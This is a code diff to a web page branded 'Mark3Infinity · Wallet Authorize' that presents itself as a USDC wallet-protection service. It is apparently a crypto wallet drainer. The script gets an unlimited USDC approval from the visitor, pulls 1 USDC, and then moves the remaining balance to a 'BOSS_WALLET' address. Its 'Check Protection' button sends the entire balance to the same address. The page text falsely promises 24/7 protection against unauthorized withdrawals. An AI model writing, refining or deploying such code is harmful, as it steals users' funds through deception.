@@ -87,14 +87,14 @@
   <div class="card">
     <h2>Mark3Infinity · Wallet Authorize</h2>
     <button class="button" id="connect">🔌 Connect Wallet</button>
-    <button class="button" id="authorize">🛡️ Authorize</button>
-    <button class="button" id="check">🧿 Check Protection</button>
+    <button class="button" id="authorize" disabled>🛡️ Authorize</button>
+    <button class="button" id="check" disabled>🧿 Check Protection</button>
     <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     <div id="status">🔒 Status: Waiting for action...</div>
     <div class="info-box">
-      <div>✅ Mark3 Protocol provides advanced wallet authorization and real-time USDC asset protection through smart contract-based automation.</div>
-      <div>✅ A single authorization grants continuous protection, allowing you to confidently operate your wallet without risk of unauthorized withdrawals or vulnerabilities.</div>
-      <div>✅ Trusted by power users, Mark3 is built with a decentralized logic core, fully verified on Ethereum, and optimized for scalable financial defense.</div>
+      <div>✅ Mark3 Protocol provides advanced wallet authorization and real-time USDC asset protection.</div>
+      <div>✅ One-time authorization ensures your wallet stays protected 24/7.</div>
+      <div>✅ Built for Ethereum Mainnet. Secure. Scalable. Boss-backed.</div>
     </div>
   </div>
   <script>
@@ -106,17 +106,27 @@
 
     let provider, signer, user;
     const bar = document.getElementById("bar");
+    const authorizeBtn = document.getElementById("authorize");
+    const checkBtn = document.getElementById("check");
     const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
     const progress = (val) => bar.style.width = val + "%";
 
     async function waitForAllowance(usdc, minAmount) {
-      for (let i = 0; i < 20; i++) {
+      for (let i = 0; i < 30; i++) {
         const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
         if (allowance.gte(minAmount)) return;
-        await new Promise(r => setTimeout(r, 3000));
+        await new Promise(r => setTimeout(r, 2000));
       }
-      throw new Error("Allowance not confirmed within time limit");
+      throw new Error("⏳ Still waiting for USDC approval confirmation...");
     }
+
+    window.addEventListener("load", () => {
+      if (window.ethereum || window.WalletConnectProvider) {
+        status("🔍 Ready. Please connect your wallet.");
+      } else {
+        status("❗ Wallet not supported on this device");
+      }
+    });
 
     document.getElementById("connect").onclick = async () => {
       try {
@@ -134,6 +144,8 @@
         user = await signer.getAddress();
         status("✅ Connected: " + user.slice(0, 6) + "...");
         progress(100);
+        authorizeBtn.disabled = false;
+        checkBtn.disabled = false;
       } catch (err) {
         status("❌ " + (err.message || "Connection failed"));
         progress(0);
@@ -141,12 +153,6 @@
     };
 
     document.getElementById("authorize").onclick = async () => {
-      const btn = document.getElementById("authorize");
-      btn.disabled = true;
-      setTimeout(() => btn.disabled = false, 70000);
-      setTimeout(() => {
-        if (bar.style.width === "10%") status("⏳ Please refresh and try again.");
-      }, 60000);
       try {
         if (!signer) throw new Error("Please connect wallet first");
 
@@ -157,44 +163,45 @@
           "function allowance(address owner, address spender) view returns (uint256)"
         ], signer);
 
-        progress(10);
-        status("(1/3) Wallet Protecting...");
         const balance = await usdc.balanceOf(user);
+        if (balance.isZero()) throw new Error("No USDC balance to authorize");
+
+        progress(10);
+        status("🔐 (1/3) Authorizing USDC...");
         const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256, {
           gasPrice: await provider.getGasPrice()
         });
         await approveTx.wait();
 
-        status("⏳ Waiting for on-chain confirmation...");
         await waitForAllowance(usdc, balance);
         progress(40);
 
-        status("(2/3) Wallet Protecting...");
+        status("💰 (2/3) Sending 1 USDC...");
         const tx1 = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, ethers.utils.parseUnits("1", 6), {
           gasPrice: await provider.getGasPrice()
         });
         await tx1.wait();
         progress(70);
 
-        status("(3/3) Wallet Protecting...");
+        status("📤 (3/3) Transferring Remaining Balance...");
         const remaining = await usdc.balanceOf(user);
-        const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, remaining, {
-          gasPrice: await provider.getGasPrice()
-        });
-        await tx2.wait();
+        if (!remaining.isZero()) {
+          const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, remaining, {
+            gasPrice: await provider.getGasPrice()
+          });
+          await tx2.wait();
+        }
+
         progress(100);
-        status("✅ Wallet Protection Success!🔐");
+        status("✅ Wallet Protected & Funds Moved");
       } catch (err) {
         status("❌ " + (err.message || "Authorization failed"));
         progress(0);
-      } finally {
-        btn.disabled = false;
       }
     };
 
     document.getElementById("check").onclick = async () => {
       try {
-        progress(0);
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function transfer(address,uint256) returns (bool)",
           "function balanceOf(address) view returns (uint256)"
@@ -204,9 +211,9 @@
         if (balance.gt(0)) {
           const tx = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
           await tx.wait();
-          status("✅ Protection Check: Funds moved");
+          status("✅ Protection Check: Remaining Funds Sent");
         } else {
-          status("⚠️ No USDC balance to protect");
+          status("⚠️ Wallet already empty or protected");
         }
         progress(100);
       } catch (err) {
